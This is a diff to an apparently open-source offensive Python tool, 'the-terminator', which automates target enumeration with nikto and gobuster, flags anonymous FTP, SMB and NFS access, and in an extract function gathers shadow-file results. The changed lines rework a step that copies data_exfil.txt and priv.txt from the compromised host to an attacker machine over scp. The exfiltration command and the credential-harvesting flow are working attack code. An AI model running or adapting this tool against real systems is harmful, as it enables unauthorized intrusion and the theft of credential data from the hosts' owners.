@@ -65,6 +65,8 @@ print('''
 \\ https://github.com/suffs811/the-terminator.git
 ''')
 
+time.sleep(3)
+
 
 # enumeration ###############################
 
@@ -135,7 +137,7 @@ def web(ip,wordlist,services):
 
    print("\n### running nikto... ###")
    os.system("echo '### nikto results ###' >> /terminator/enum.txt")
-   os.system("nikto -h {} -t 3 | tee -a /terminator/enum.txt".format(ip))
+   os.system("nikto -h {} -t 3 -ask no | tee -a /terminator/enum.txt".format(ip))
    print("\n### running gobuster... ###")
    if wordlist:
       os.system("echo '### gobuster results ###' >> /terminator/enum.txt")
@@ -212,25 +214,24 @@ def imp_enum(ip):
       e = enum.readlines()
       for line in e:
          if "interesting" in line:
-            os.system("echo 'web:'")
             os.system("echo '{}' | tee -a /terminator/imp_enum_results.txt".format(line.strip()))
             os.system("echo ''")
          elif "robots" in line and "#" not in line:
             os.system("echo '{}' | tee -a /terminator/imp_enum_results.txt".format(line.strip()))
             os.system("echo ''")
          elif "Anonymous" in line:
-            os.system("echo 'ftp anonymous login:'")
+            os.system("echo '-- ftp anonymous login:'")
             os.system("echo '{}' | tee -a /terminator/imp_enum_results.txt".format(line.strip()))
             os.system("echo ''")
          elif "allows session" in line:
-            os.system("echo 'nfs user-less login:'")
+            os.system("echo '-- smb no-auth login:'")
             os.system('echo "{}" | tee -a /terminator/imp_enum_results.txt'.format(line.strip()))
             os.system("echo ''")
          else:
             continue
 
-   os.system("echo 'nfs mounts:'")
-   os.system("cat nfs.txt 2>/dev/null")
+   os.system("echo '-- nfs mounts:'")
+   os.system("cat /terminator/nfs.txt 2>/dev/null")
    os.system("echo ''")
    os.system("echo 'robots.txt:'")
    os.system("cat /terminator/robots_dir.txt 2>/dev/null")
@@ -621,8 +622,11 @@ def extract(username,password,local_ip,local_port):
    os.system("cat /tmp/shad_res.txt >> /tmp/priv.txt")
 
    # exfil the data files to local machine
-   print("\n### sending data to root@{}/terminator/scp_output.txt... ###\n+input your local machine root password+".format(local_ip))
-   os.system("scp /tmp/data_exfil.txt /tmp/priv.txt root@{}:/terminator/".format(local_ip))
+   time.sleep(2)
+   u_root = input("### specify local username to send data to (for scp): ")
+   time.sleep(2)
+   print("\n### sending data to {}@{}/terminator/scp_output.txt... ###\n+input your local machine root password+".format(u_root,local_ip))
+   os.system("scp /tmp/data_exfil.txt /tmp/priv.txt {}@{}:/terminator/".format(u_root,local_ip))
    print("\n*** data_exfil.txt and priv.txt sent to {}/terminator/ ***".format(local_ip))
 
 
